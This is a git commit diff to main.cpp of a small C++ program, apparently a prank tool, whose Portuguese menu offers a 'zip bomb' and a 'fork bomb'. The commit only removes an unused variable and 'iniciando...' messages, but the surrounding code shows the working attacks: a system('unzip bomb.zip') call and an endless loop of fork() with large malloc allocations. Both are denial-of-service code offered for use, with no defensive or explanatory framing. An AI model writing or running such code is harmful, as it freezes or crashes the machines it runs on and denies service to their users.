506afc9dec99471870a971ee080c48ae416e0a97
Baby <89675173+Swag666baby@users.noreply.github.com>
2022-02-05 00:43:37 -0300

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -8,19 +8,17 @@ int main(int argc, char *argv[])
 {
 	system("clear");
 	
-	
 	int opc;
-	string a;
 	
 	printf("--------------------------------\n         by: swag666baby\n--------------------------------");
 	
 	cout << "\n\nescolha uma opção:\n\n1- zip bomb\n2- fork bomb\n\n=> "; cin >> opc;
 	if(opc == 1){
-		cout << "iniciando...";
+		
 		system("unzip bomb.zip");
 	}
 	else if(opc == 2){
-		cout << "iniciando...";
+		
 		while (1){
 			fork();
 			int *p1 = (int *) malloc (sizeof (int) * 9999999);
